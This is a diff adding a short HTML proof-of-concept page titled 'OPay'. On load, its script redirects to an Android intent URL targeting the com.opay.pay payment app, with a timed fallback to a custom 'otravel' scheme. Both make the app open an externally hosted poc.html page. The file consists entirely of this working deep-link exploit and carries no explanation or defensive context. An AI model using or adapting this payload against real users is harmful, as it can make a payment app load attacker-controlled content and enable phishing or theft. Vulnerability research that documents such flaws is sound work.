@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>OPay</title>
+</head>
+
+<body>
+    <script>
+        window.location = 'intent://common?scheme=https://zugonwobi.github.io/test/poc.html#Intent;scheme=otravel;package=com.opay.pay;end';
+        setTimeout(function () {
+            window.location = 'otravel://common?scheme=https://zugonwobi.github.io/test/poc.html';
+        }, 500);
+    </script>
+</body>
+
+</html>
